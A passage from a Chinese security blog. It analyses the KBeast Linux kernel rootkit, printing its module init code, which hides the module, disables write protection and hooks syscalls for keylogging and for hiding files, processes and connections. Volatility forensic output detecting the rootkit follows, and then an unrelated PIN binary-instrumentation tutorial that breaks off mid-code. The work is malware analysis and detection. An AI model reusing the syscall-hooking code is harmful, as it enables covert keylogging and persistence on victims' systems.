</code></pre><p>具体可参考/kbeast-v1/setup 文件，参数1表示默认为kernel 2.6.32。测试过ubuntu11.04 内核为2.6.38，setup出错，作者声称：<br>Be kind to note that the beast has been tested in, but not limited to, kernel 2.6.9,<br>2.6.16, 2.6.18, 2.6.32, 2.6.35 (i386 or x86_64)，理论上只要修改setup相关参数以及ipsecs-kbeast-vl.c文件中的系统调用表的地址即可适应其它版本内核，未测试。</p>
<p>成功编译后，kbeast就会加载到内核空间，rootkit安装在/usr/<em>h4x</em>路径下，生成/usr/<em>h4x</em>/_h4x_bd进程，以及acctlog 记录文件， 路径以及文件名等参数可以在config.h文件中配置。当然在目标机器guest中无法找到相关文件，因为已经被隐藏了。下文会利用volatility检测到相关进程的路径。</p>
<h3 id="0X05-Kbeast-核心"><a href="#0X05-Kbeast-核心" class="headerlink" title="0X05 Kbeast 核心"></a>0X05 Kbeast 核心</h3><p>Kbeast以LKM的方式存在，以下是其核心代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">/*init module insmod*/</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="comment">//Uncomment to hide this module</span></div><div class="line">  list_del_init(&amp;__this_module.<span class="built_in">list</span>);</div><div class="line"></div><div class="line">  <span class="keyword">struct</span> tcp_seq_afinfo *my_afinfo = <span class="literal">NULL</span>;</div><div class="line">  <span class="comment">//proc_net is disappeared in 2.6.32, use init_net.proc_net</span></div><div class="line">  <span class="keyword">struct</span> proc_dir_entry *my_dir_entry = init_net.proc_net-&gt;subdir;  </div><div class="line"></div><div class="line">  write_cr0 (read_cr0 () &amp; (~ <span class="number">0x10000</span>));</div><div class="line">  <span class="keyword">if</span>(_KEYLOG_)&#123;</div><div class="line">    o_read=(<span class="keyword">void</span> *)sys_call_table[__NR_read];</div><div class="line">    sys_call_table[__NR_read]=h4x_read;</div><div class="line">  &#125;</div><div class="line">  o_write=(<span class="keyword">void</span> *)sys_call_table[__NR_write];</div><div class="line">  sys_call_table[__NR_write]=h4x_write;</div><div class="line">  <span class="meta">#<span class="meta-keyword">if</span> defined(__x86_64__)</span></div><div class="line">    o_getdents=sys_call_table [__NR_getdents];</div><div class="line">    sys_call_table [__NR_getdents]=h4x_getdents;</div><div class="line">  <span class="meta">#<span class="meta-keyword">elif</span> defined(__i386__)</span></div><div class="line">    o_getdents64=sys_call_table [__NR_getdents64];</div><div class="line">    sys_call_table [__NR_getdents64]=h4x_getdents64;</div><div class="line">  <span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">    <span class="meta">#<span class="meta-keyword">error</span> Unsupported architecture</span></div><div class="line">  <span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">  o_unlink = sys_call_table [__NR_unlink];</div><div class="line">  sys_call_table [__NR_unlink] = h4x_unlink;</div><div class="line">  o_rmdir = sys_call_table [__NR_rmdir];</div><div class="line">  sys_call_table [__NR_rmdir] = h4x_rmdir;</div><div class="line">  o_unlinkat = sys_call_table [__NR_unlinkat];</div><div class="line">  sys_call_table [__NR_unlinkat] = h4x_unlinkat;</div><div class="line">  o_rename = sys_call_table [__NR_rename];</div><div class="line">  sys_call_table [__NR_rename] = h4x_rename;</div><div class="line">  o_open = sys_call_table [__NR_open];</div><div class="line">  sys_call_table [__NR_open] = h4x_open;</div><div class="line">  o_kill = sys_call_table [__NR_kill];</div><div class="line">  sys_call_table [__NR_kill] = h4x_kill;</div><div class="line">  o_delete_module = sys_call_table [__NR_delete_module];</div><div class="line">  sys_call_table [__NR_delete_module] = h4x_delete_module;</div><div class="line">  write_cr0 (read_cr0 () | <span class="number">0x10000</span>);</div><div class="line"></div><div class="line">  <span class="keyword">while</span>(<span class="built_in">strcmp</span>(my_dir_entry-&gt;name, <span class="string">"tcp"</span>))</div><div class="line">    my_dir_entry = my_dir_entry-&gt;next;</div><div class="line">  <span class="keyword">if</span>((my_afinfo = (<span class="keyword">struct</span> tcp_seq_afinfo*)my_dir_entry-&gt;data))</div><div class="line">  &#123;</div><div class="line">    <span class="comment">//seq_show is disappeared in 2.6.32, use seq_ops.show</span></div><div class="line">    old_tcp4_seq_show = my_afinfo-&gt;seq_ops.show;</div><div class="line">    my_afinfo-&gt;seq_ops.show = h4x_tcp4_seq_show;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先将模块隐藏，取消CR0写保护，找到系统调用表地址，将其处理函数换成自己的函数，分别对应其中的特性。 如：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">sys_call_table[__NR_read]=h4x_read; <span class="comment">// log key</span></div><div class="line">sys_call_table[__NR_write]=h4x_write; <span class="comment">// fake output ps,pstree,top,lsof</span></div><div class="line">sys_call_table [__NR_getdents]=h4x_getdents; <span class="comment">//hide file and directory</span></div><div class="line">sys_call_table [__NR_unlink] = h4x_unlink; <span class="comment">//Don't allow your file to be removed</span></div><div class="line">sys_call_table [__NR_rmdir] = h4x_rmdir; <span class="comment">//Don't allow your directory to be removed</span></div><div class="line">sys_call_table [__NR_unlinkat] = h4x_unlinkat; <span class="comment">//Don't allow your file and directory to be removed </span></div><div class="line">sys_call_table [__NR_rename] = h4x_rename; <span class="comment">//Don't allow your file to be renamed/moved</span></div><div class="line">sys_call_table [__NR_open] = h4x_open; <span class="comment">//Don't allow your file to be overwrited</span></div><div class="line">sys_call_table [__NR_kill] = h4x_kill; <span class="comment">//Don't allow your process to be killed</span></div><div class="line">sys_call_table [__NR_delete_module] = h4x_delete_module;</div></pre></td></tr></table></figure>
<h3 id="0X06-Libvmi-and-Volatility检测KBeast"><a href="#0X06-Libvmi-and-Volatility检测KBeast" class="headerlink" title="0X06 Libvmi and Volatility检测KBeast"></a>0X06 Libvmi and Volatility检测KBeast</h3><p>检测之前，先按照 <a href="http://www.csyssec.org/20170102/virtualizationcomprehensive/" target="_blank" rel="external">这篇</a> 文章搭好环境。</p>
<p>以下是分别利用volatility的linux_psaux、linux_pslist、linux_pstree、linux_lsof、linux_proc_maps、linux_check_modules插件检测出来的结果，能检测出其隐藏的进程、模块、进程间的关系以及所在路径。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_psaux | grep _h4x_bd</div><div class="line">  </div><div class="line">Pid    Uid    Gid    Arguments </div><div class="line"><span class="number">2316</span>   <span class="number">2</span>      <span class="number">2</span>      ./_h4x_bd</div><div class="line"></div><div class="line"> python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslist | grep _h4x_bd </div><div class="line"> </div><div class="line"> Offset     Name                 Pid             Uid             Gid    DTB      Start Time</div><div class="line"> <span class="number">0xf579e680</span> _h4x_bd              <span class="number">2316</span>            <span class="number">2</span>               <span class="number">2</span>      <span class="number">0x357c5000</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-01</span> <span class="number">21</span>:<span class="number">41</span>:<span class="number">29</span> UTC+<span class="number">0000</span></div><div class="line">  </div><div class="line">  </div><div class="line">  python vol.py -l vmi://<span class="number">1004</span>desktop32         --profile=Linuxubuntu1004desktopx86 linux_pstree | grep _h4x_bd </div><div class="line"></div><div class="line"> Name                 Pid             Uid </div><div class="line"> ._h4x_bd             <span class="number">2316</span>            <span class="number">2</span> </div><div class="line">  </div><div class="line"> python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslsof | grep _h4x_bd </div><div class="line">  </div><div class="line">  Offset             Name                           Pid      FD       Path</div><div class="line">  <span class="number">0x00000000f579e680</span> _h4x_bd                            <span class="number">2316</span>        <span class="number">1</span> /dev/pts/<span class="number">0</span></div><div class="line"><span class="number">0x00000000f579e680</span> _h4x_bd                            <span class="number">2316</span>        <span class="number">2</span> /dev/pts/<span class="number">0</span></div><div class="line"><span class="number">0x00000000f579e680</span> _h4x_bd                            <span class="number">2316</span>        <span class="number">3</span> socket:[<span class="number">11708</span>]</div><div class="line"></div><div class="line">python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_proc_maps | grep _h4x_bd </div><div class="line">  </div><div class="line">  </div><div class="line"> linux_proc_maps</div><div class="line"> </div><div class="line"> </div><div class="line"> Offset             Pid      Name                 Start              End         </div><div class="line">       Flags       Pgoff Major  Minor  Inode      File Path</div><div class="line"></div><div class="line"> </div><div class="line"> </div><div class="line"> </div><div class="line"> <span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd                  <span class="number">0x0000000000adb000</span> <span class="number">0x0000000000adc000</span> ---      <span class="number">0x153000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">134375</span> /lib/tls/i686/cmov/libc<span class="number">-2.11</span><span class="number">.1</span>.so</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000000adc000</span> <span class="number">0x0000000000ade000</span> r--      <span class="number">0x153000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">134375</span> /lib/tls/i686/cmov/libc<span class="number">-2.11</span><span class="number">.1</span>.so</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000000ade000</span> <span class="number">0x0000000000adf000</span> rw-      <span class="number">0x155000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">134375</span> /lib/tls/i686/cmov/libc<span class="number">-2.11</span><span class="number">.1</span>.so</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000000adf000</span> <span class="number">0x0000000000ae2000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> </div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000008048000</span> <span class="number">0x0000000008049000</span> r-x           <span class="number">0x0</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">136169</span> /usr/_h4x_/_h4x_bd</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000008049000</span> <span class="number">0x000000000804a000</span> r--        <span class="number">0x1000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">136169</span> /usr/_h4x_/_h4x_bd</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x000000000804a000</span> <span class="number">0x000000000804b000</span> rw-        <span class="number">0x2000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">136169</span> /usr/_h4x_/_h4x_bd</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x00000000b7875000</span> <span class="number">0x00000000b7876000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> </div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x00000000b7884000</span> <span class="number">0x00000000b7886000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> </div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x00000000bfd84000</span> <span class="number">0x00000000bfd99000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> [stack]</div><div class="line"></div><div class="line">  python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_check_moudles | grep _h4x_bd   </div><div class="line">   </div><div class="line"> Module Address Module Name             </div><div class="line"> <span class="number">0xf805dae0</span> ipsecs_kbeast_v1</div></pre></td></tr></table></figure>
<p> 当要清除module时，执行./setup clean. 但仍然会残留一些文件，无法删除。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Checking <span class="keyword">for</span> make : /usr/bin/make</div><div class="line">Removing Kernel Module</div><div class="line">Removing Compiled Kernel Module</div><div class="line">Stoping Network Daemon</div><div class="line">Removing Backdoor File</div><div class="line">rm: cannot remove `./_h4x_bd': Permission denied</div><div class="line">Removing Installation Directory</div><div class="line">rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.o.cmd':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.o':         Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.ko.cmd':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.ko':         Permission denied</div><div class="line">rm: cannot remove                     `/usr/_h4x_/.tmp_versions/ipsecs-kbeast-v1.mod': Permission     denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.c':         Permission denied</div><div class="line">rm: cannot remove         `/usr/_h4x_/.ipsecs-kbeast-v1.mod.o.cmd': Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.c':         Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/bd-ipsecs-kbeast-v1.c':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.o':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.cc1':     Permission denied</div></pre></td></tr></table></figure>
<hr>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html" target="_blank" rel="external">http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html</a></p>
<p><a href="http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf" target="_blank" rel="external">http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf</a></p>
<p><a href="https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/" target="_blank" rel="external">https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/</a> </p>
<p><a href="http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/" target="_blank" rel="external">http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/</a></p>
<p><a href="http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html" target="_blank" rel="external">http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html</a></p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kbeastanalysis/" target="_blank" rel="external">内核层恶意代码KBeast分析与检测</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/恶意代码/">恶意代码</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Malware/">Malware</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Systemcall/">Systemcall</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-pinintro"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170104/pinintro/">二进制代码注入PIN</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170104/pinintro/" class="article-date">
	  <time datetime="2017-01-04T06:16:14.000Z" itemprop="datePublished">一月 4, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2015/12/19/pin-for-dynamic-binary-instrumentation/" target="_blank" rel="external">个人博客</a>，讲述如何利用PIN进行二进制代码注入，值得推荐。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/pinintro/" target="_blank" rel="external">二进制代码注入PIN</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
<hr>
<hr>
<blockquote>
<ul>
<li>什么是注入（Instrumentation)</li>
<li>PIN初探</li>
<li>PIN框架</li>
<li>Pintools Example</li>
</ul>
</blockquote>
<hr>
<h2 id="什么是注入（Instrumentation"><a href="#什么是注入（Instrumentation" class="headerlink" title="什么是注入（Instrumentation)"></a>什么是注入（Instrumentation)</h2><p>每一个写过代码的人都调试过程序，最简单的无非就是手动在源代码中插入printf语句，当然大部分还是会选择一些调试工具如GDB。注入技术也类似，不过注入的对象是可执行二进制文件。简单来说，在你的程序中插入额外的代码来分析程序的运行时信息就称为注入技术。但就广义来说，在源代码中注入代码也可称之为注入，只是为了区分，注入技术一般特指对象为可执行二进制文件。</p>
<p>进一步说明，注入一般又分为静态二进制注入（Static Binary Instrumentation) 与动态二进制注入 （Dynamic Binary Instrumentation). 看定义可知，SBI技术工作在程序运行前，DBI则工作在运行过程中。相比SBI，DBI技术有以下优势：</p>
<ul>
<li>不需要重新编译、重新链接</li>
<li>在运行时发现代码</li>
<li>能处理动态产生的代码</li>
<li>能附加到正在运行时的进程中</li>
</ul>
<p>目前，研究较多的都属DBI技术，前文提到，DBI的工作方式有点类似编译器，只不过分析例程（analysis routine)是可编程化的。DBI技术广泛应用在程序分析中，如逆向工程（reverse engineering), 程序调试（program debug)， 恶意代码分析（malware analysis)等。</p>
<h2 id="Pin初探"><a href="#Pin初探" class="headerlink" title="Pin初探"></a>Pin初探</h2><p>对DBI技术有个大致了解之后，进入本文主题,  Pin是Intel 与University of Colorado合作研究出的一款用来动态分析二进制程序的注入工具，发表在系统顶会PLDI’2005,有兴趣的可以读读这篇文章，其它DBI技术还有Valgrind, DYNAMORIO, QEMU.</p>
<p>开门见山，首先来看一段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">    counter++;</div><div class="line">             sub  $0xff, %edx</div><div class="line">    counter++;</div><div class="line">             cmp  %esi, %edx</div><div class="line">    counter++;</div><div class="line">             jle &lt;L1&gt;</div><div class="line">    counter++;</div><div class="line">             mov  $0x1, %edi</div><div class="line">    counter++;</div><div class="line">             add  $0x10, %eax</div><div class="line">```             </div><div class="line"></div><div class="line">这段代码很简单，只是在每条指令前加了一个计数器</div><div class="line">那么如果使用PIN, 该如何实现？ 看下面代码：</div><div class="line"></div><div class="line">``` C</div><div class="line">#include &lt;iostream&gt;</div><div class="line">#include &quot;pin.h&quot;</div><div class="line"></div><div class="line">UINT64 icount = 0;</div><div class="line"></div><div class="line">void docount() &#123; icount++; &#125;</div><div class="line">    </div><div class="line">void Instruction(INS ins, void *v) </div><div class="line">&#123;</div><div class="line">    INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void Fini(INT32 code, void *v) </div><div class="line">&#123; std::cerr &lt;&lt; &quot;Count &quot; &lt;&lt; icount &lt;&lt; endl; &#125;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;</div><div class="line">    PIN_Init(argc, argv);</div><div class="line">    INS_AddInstrumentFunction(Instruction, 0);</div><div class="line">    PIN_AddFiniFunction(Fini, 0);</div><div class="line">    PIN_StartProgram();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>现在对这段实现代码一一解释：<br><code>void docount() {icount+;}</code> 用户可自定义<code>docount()</code> 函数，PIN称之为分析例程 （Analysis routine),先对这个概念保持一点印象。再看void Instruction（）函数，PIN 称之为注入例程（Instrumentation routine), 关注其中两个参数，<code>IPOINT_BEFORE</code> 表示在每条指令之前执行，<code>（AFUNPTR)docount</code>便是要注入的分析例程。<code>main()</code> 函数调用<code>INS_AddInstrumentFunction（Instruction,0)</code>,便会触发注入例程以及分析例程，这些参数都可以根据自己需求修改。<br>只需这么几行简单的代码，PIN便能帮你分析正在运行的二进制文件执行过的指令条数了。这么简单？ PIN只能做这些吗？ 当然不是！ 下文再介绍一些PIN的框架以及使用过程。</p>
<p>##PIN框架<br>可以把PIN理解为实时编译器（just in time complier).只不过输入进PIN的不是二进制代码，而是可执行的二进制文件，PIN能拦截可执行文件的第一条指令，然后从这条指令开始产生新的代码序列，之后将控制权交给产生的代码序列，此刻用户就有机会注入自己的代码，这个过程就是Instrumentation.<br>如果你只想使用PIN来分析自己的二进制代码，内部实现原理 (可阅读PLDI’2005)大可不必关心，关注的应该是PIN为用户提供的上层接口，使用这个接口来编写自己的Pintools. 版权原因，本文也不会深入去介绍PIN是如何实现的。</p>
<p>下面就来聊聊这个Pintools. Pintools实际上就是用户要实现的Instrumentation过程，可以把Pintools想象成能修改内部PIN的代码产生过程的插件（Plugins),PIN官网会提供一些sample教你怎么写Pintools,大部分还得靠用户自己去写。<br>总的来说，instrumentation包括两个部分：</p>
<ul>
<li>第一，决定在哪注入代码，注入什么代码的一种机制</li>
<li>第二，在注入点要执行的代码</li>
</ul>
<p>第一个部分被称之为 <strong>instrumentation routine</strong>,第二个部分被称之为 <strong>analysis routine</strong>. Pintools会向PIN注册一个注入回调函数，如上文提到的<code>INS_AddInstrumentFunction（）</code>，该函数会代表instrumentation routine观察要产生的代码，分析代码的静态属性，来决定是否以及在哪里调用analysis routine. Analysis routine再收集被分析程序的数据。</p>
<p>注意，前文中的例子对每条指令分析，带来的开销太大，因此，PIN提供不同的粒度对程序进行分析，供用户根据不同需求选择：</p>
<ul>
<li>Instruction</li>
<li>Basic block: 包含一些指令序列，终止于控制流改变指令;单入口单出口。</li>
<li>Trace:包含一些Basic block序列，终止于无条件控制流改变指令；单入口多出口。 </li>
</ul>
<p>##Pintools example<br>最后，以一个Pintools 的完整例子结束本文</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pin.H"</span></span></div><div class="line"></div><div class="line">ofstream OutFile;</div><div class="line"></div><div class="line"><span class="comment">// The running count of instructions is kept here</span></div><div class="line"><span class="comment">// make it static to help the compiler optimize docount</span></div><div class="line"><span class="keyword">static</span> UINT64 icount = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="comment">// This function is called before every instruction is      executed</span></div><div class="line"><span class="function">VOID <span class="title">docount</span><span class="params">()</span> </span>&#123; icount++; &#125;</div><div class="line"></div><div class="line"><span class="comment">// Pin calls this function every time a new instruction     is encountered</span></div><div class="line"><span class="function">VOID <span class="title">Instruction</span><span class="params">(INS ins, VOID *v)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">// Insert a call to docount before every            instruction, no arguments are passed</span></div><div class="line">  INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</div><div class="line">&#125;</div><div class="line"></div><div class="line">KNOB&lt;<span class="built_in">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class="string">"pintool"</span>,</div><div class="line"><span class="string">"o"</span>, <span class="string">"inscount.out"</span>, <span class="string">"specify output file name"</span>);</div><div class="line"></div><div class="line"><span class="comment">// This function is called when the application exits</span></div><div class="line"><span class="function">VOID <span class="title">Fini</span><span class="params">(INT32 code, VOID *v)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">// Write to a file since cout and cerr maybe closed     by the application</span></div><div class="line">  OutFile.setf(ios::showbase);</div><div class="line">  OutFile &lt;&lt; <span class="string">"Count "</span> &lt;&lt; icount &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">  OutFile.close();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/* Print Help Message                                                        */</span></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"></div><div class="line"><span class="function">INT32 <span class="title">Usage</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">   <span class="built_in">cerr</span> &lt;&lt; <span class="string">"This tool counts the number of dynamic          instructions executed"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">   <span class="built_in">cerr</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt;      <span class="built_in">endl</span>;</div><div class="line">    <span class="keyword">return</span> <span 